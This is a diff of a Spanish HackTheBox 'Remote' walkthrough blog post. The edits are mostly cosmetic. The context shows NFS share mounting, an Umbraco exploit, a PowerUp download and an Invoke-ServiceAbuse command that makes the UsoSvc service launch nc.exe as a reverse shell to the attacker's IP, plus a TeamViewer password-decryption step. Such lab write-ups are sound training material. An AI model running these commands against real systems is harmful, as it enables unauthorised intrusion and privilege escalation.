@@ -1,8 +1,10 @@
 ---
 layout      : post
 title       : "HackTheBox - Remote"
+author      : lanz
 image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/bannerremote.png
 categories  : [ htb ]
+tags        : [ cracking, CMS, UsoSvc, TeamViewer ]
 ---
 Máquina Windows nivel fácil. Jugaremos con monturas, crackeo, romperemos Umbraco yyyy encontraremos dos maneras de volvernos administradores del sistema, mediante UsoSvc y TeamViewer.
 
@@ -16,7 +18,7 @@ Máquina Windows nivel fácil. Jugaremos con monturas, crackeo, romperemos Umbra
 
 Como es habitual, reviso que servicios está corriendo la maquina, en este caso el escaneo va lento, así que le agrego algunos para acelerar el proceso.
 
-```sh
+```bash
 $ nmap -p- --open -v -n --min-rate=5000 10.10.10.180 -oG initScan
 ```
 
@@ -37,7 +39,7 @@ Con la función que maneja [s4vitar](https://s4vitar.github.io/) puedo extraer l
 
 La ejecución es sencilla, solo se debe agregar la función al `$ ~/.bashrc` y correr el comando:
 
-```sh
+```bash
 $ extractPorts initScan
 ```
 
@@ -45,7 +47,7 @@ $ extractPorts initScan
 
 Bien, ahora solo queda pegar lo que tenemos en la clipboard y usarlo en el escaneo que haré.
 
-```sh
+```bash
 $ nmap -p21,80,111,135,139,445,49665 -sC -sV 10.10.10.180 -oN portScan
 ```
 
@@ -82,13 +84,13 @@ Nada más, no hay credenciales por defecto, no hay injeccion SQL o XSS. Sigamos
 
 Internet tiene un montón de info sobre como explotar el servicio que corre en el puerto 111, entre ellos encontré un post donde explican que si en nuestro escaneo vemos **nfs** (Network File System), significa que tenemos la posibilidad de hacer una montura con la información que se está compartiendo, básicamente:
 
-* Info sobre [**showmount** y **mount**](https://medium.com/@sebnemK/how-to-bypass-filtered-portmapper-port-111-27cee52416bc)
+* [Info sobre **showmount** y **mount**](https://medium.com/@sebnemK/how-to-bypass-filtered-portmapper-port-111-27cee52416bc).
 
 > **NFS**: Posibilita que distintos sistemas conectados a una misma red accedan a ficheros remotos como si se tratara de locales.
 
 Para verificar que información o archivos están disponibles para ver.
 
-```sh
+```bash
 $ showmount -e 10.10.10.180
 ``` 
 
@@ -96,7 +98,7 @@ $ showmount -e 10.10.10.180
 
 Para hacer la montura en nuestro sistema.
 
-```sh
+```bash
 $ mount -t nfs 10.10.10.180:/site_backups ~/remote/content/rpc_info_nfs -o nolock
 ``` 
 
@@ -130,7 +132,7 @@ El exploit encontrado <<explota>> dentro de la plataforma un archivo llamado `/u
 
 Revisando el código y algunas referencias en internet, lo que le indica el programa que se va a ejecutar en la cmd (claramente) es `proc.StartInfo.FileName = "calc.exe"`, pero esta función necesita (si queremos ejecutar otra herramienta diferente a la calculadora :P) llevar algo en `proc.StartInfo.Arguments = "whatever"`. 
 
-* Explica como [`StartInfo.Arguments and StartInfo.FileName`](https://stackoverflow.com/questions/7160187/standardoutput-readtoend-hangs) trabaja.
+* [Explica como trabajan **StartInfo.Arguments** y **StartInfo.FileName**](https://stackoverflow.com/questions/7160187/standardoutput-readtoend-hangs).
 
 ![beautycsharp](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/beautycsharp.png) 
 
@@ -146,9 +148,9 @@ Pero intentando **cmd.exe** y algunas variantes para probar `whoami` no podia te
 
 Algunas referencias
 
-* [process-examples](https://www.dotnetperls.com/process)
-* [system.diagnostics.processstartinfo.argument](https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.arguments?view=netcore-3.1)
-* [how-to-pass-multiple-arguments-in-processstartinfo](https://stackoverflow.com/questions/15061854/how-to-pass-multiple-arguments-in-processstartinfo#answer-15062027)
+* [process-examples](https://www.dotnetperls.com/process).
+* [system.diagnostics.processstartinfo.argument](https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.arguments?view=netcore-3.1).
+* [how-to-pass-multiple-arguments-in-processstartinfo](https://stackoverflow.com/questions/15061854/how-to-pass-multiple-arguments-in-processstartinfo#answer-15062027).
 
 Perfecto puedo ejecutar comandos dentro de la maquina, lo siguiente seria lograr una reverseshell o alguna herramienta/archivo que se vea interesante. Desde el exploit puedo ver la flag del `user.txt`, peeero la papita esta en conseguir una reverse shell.
 
@@ -168,21 +170,23 @@ Ahora queda ejecutar una peticion con **nc.exe** hacia mi maquina pidiendole que
 
 Listos, adeeeeentro. A por la escalacion de privilegios.
 
+...
+
 ## Escalada de privilegios
 
 Revisando permisos con `> whoami /priv` me muestra esto:
 
 ![iiswhoamipriv](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/isswhoamipriv.png) 
 
-Revisando por internet al tener el privilegio `SeImpersonatePrivilege - Impersonate a client after authentication` habilitado existe un programa (**JuicyPotato.exe**) que se apoya en el privilegio que tenemos para ejecutar la tarea especificada como Administrador. Estuve un tiempo intentando pero no logre que funcionara, en internet hacian referencia (y en un video de [ippsec](https://www.youtube.com/watch?v=1ae64CdwLHE&t=2320) que si el sistema operativo tenia que ver con Server 2019 no iba a funcionar. Asi que entendí el por que de que no me sirviera) ): (o quizas fue error mio)
+Revisando por internet al tener el privilegio `SeImpersonatePrivilege - Impersonate a client after authentication` habilitado existe un programa (**JuicyPotato.exe**) que se apoya en el privilegio que tenemos para ejecutar la tarea especificada como Administrador. Estuve un tiempo intentando pero no logre que funcionara, en internet hacian referencia (y en un video de [ippsec](https://www.youtube.com/watch?v=1ae64CdwLHE&t=2320) que si el sistema operativo tenia que ver con Server 2019 no iba a funcionar. Asi que entendí el por que de que no me sirviera) ): (o quizas fue error mio).
 
 Info del sistema:
 
 ![iissysteminfo](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/isssysteminfo.png) 
 
-Enumerando y revisando, encontramos con el comando `> netstat -a` las conexiones de red actuales
+Enumerando y revisando, encontramos con el comando `> netstat -a` las conexiones de red actuales.
 
-* Info netstat: [netstat-command-usage-on-windows](https://geekflare.com/netstat-command-usage-on-windows/)
+* [Info netstat: netstat-command-usage-on-windows](https://geekflare.com/netstat-command-usage-on-windows/).
 
 ![iisnetstata](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/issnetstata.png)
 
@@ -202,6 +206,8 @@ Revisé el foro oficial en HTB de la maquina a ver si podria enfocar lo que teni
 
 Pues leyendo vi que hay dos maneras para explotar, una que relacionaban con TV (perfecto para no spoilear, ademas ya sabemos que significa) y otra (que llamaban U....c) que entendi solo cuando a alguien se le solto y no lo marcaron como spoiler. **Vamos a resolverla por los dos metodos :)**
 
+...
+
 ### Método UsoSvc
 
 Pues si, buscando informacion me encontre con que **UsoSvc** basicamente funciona como administrador de actualizaciones en windows
@@ -214,14 +220,14 @@ Pues si, buscando informacion me encontre con que **UsoSvc** basicamente funcion
 
 Guiandome con un video de [s4vitar](https://www.youtube.com/watch?v=qEhXMZ1GYpE&t=3057) en el que explota en una maquina el mismo servicio **UsoSvc** realizaremos esto:
 
-#### 1. Pues descargarnos PowerUp.ps1 :P
-#### 2. Pasarlo a windows
+##### 1. Pues descargarnos PowerUp.ps1 :P
+##### 2. Pasarlo a windows
 
 ~ Linux:
 
 Levantamos un servidor web donde tengamos el archivo.
 
-```sh
+```bash
 $ python -m SimpleHTTPServer
 ```
 
@@ -229,7 +235,7 @@ $ python -m SimpleHTTPServer
 
 Podriamos correr el exploit para pasarnos el **PowerUp.ps1** pero viendo el video aprendi que no era necesario, podemos hacerlo desde cmd simplemente moviendonos a la carpeta donde queremos el archivo y abriendo una sesión powershell.
 
-```sh
+```powershell
 > powershell
 PS > Invoke-WebRequest http://10.10.15.69:<puerto_que_levanta_python>/PowerUp.ps1 -o PowerUp.ps1 # -o de output, le ponemos el nombre de como queremos que quede el archivo
 PS > Invoke-Module ./PowerUp.ps1
@@ -248,7 +254,7 @@ Revisando este archivo no hay algo que resalte.
 
 Pues ya solo nos queda ejecutar la instrucción que el propio **checks** nos brinda: `Invoke-ServiceAbuse -ServiceName 'UsoSvc'` pasándole el comando que queremos ejecutar. 
 
-```sh
+```powershell
 PS > Invoke-ServiceAbuse -ServiceName 'UsoSvc' -Command "c:\Windows\TEMP\\nc.exe 10.10.15.69 443 -e cmd.exe"
 ```
 
@@ -261,6 +267,8 @@ Las flags serían estas:
 ![psechoflags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/remote/psechoflags.png) 
 
 Lo que vi con este método es que la conexión se pierde a los pocos segundos (ya te imaginas como conseguí las flags :s) Ni siquiera sabría como buscar en internet si es un problema, un comando que necesito de más o incluso que la propia maquina es la que pueda estar terminando la petición.
+
+...
 
 ### Método TV (TeamViewer)
 
@@ -288,7 +296,7 @@ Vemos el ID del que se habla, un usuario **admin** y una contraseña en cifrado 
 
 Pues hay un blog que explica como se ejecuta la vulnerabilidad y además nos brinda un **exploit** en el que solo debemos modificar la cadena AES. Pero hablando muy sencillo, es que TeamViewer usa por defecto una **key** y un **iv**, por lo tanto si esos dos parámetros son reusables podemos, primero, desencriptar la cadena que contiene la pw y después escalar privilegios.
 
-* [Acá la gran explicación y el exploit](https://whynotsecurity.com/blog/teamviewer/)
+* [Acá la gran explicación y el exploit](https://whynotsecurity.com/blog/teamviewer/).
 
 Modificando la cadena y ejecutando el exploit quedaría así:
 
